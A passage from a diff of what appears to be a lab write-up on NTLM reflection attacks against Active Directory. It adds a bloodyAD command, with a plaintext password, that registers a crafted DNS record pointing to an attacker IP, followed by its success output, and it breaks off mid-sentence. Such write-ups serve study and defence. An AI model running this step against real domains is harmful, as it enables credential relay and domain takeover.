@@ -962,5 +962,8 @@ First ill disable SMB signing via the web interface
 https://www.depthsecurity.com/blog/using-ntlm-reflection-to-own-active-directory/
 
 ```python
-
+bloodyAD --host dc.novaforge.local -d novaforge.local -u daniel.brooks -p 'Password123!' add dnsRecord --dnstype A localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA 192.168.211.2 
+[+] localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA has been successfully added
 ```
+
+First ill add the DNS reo
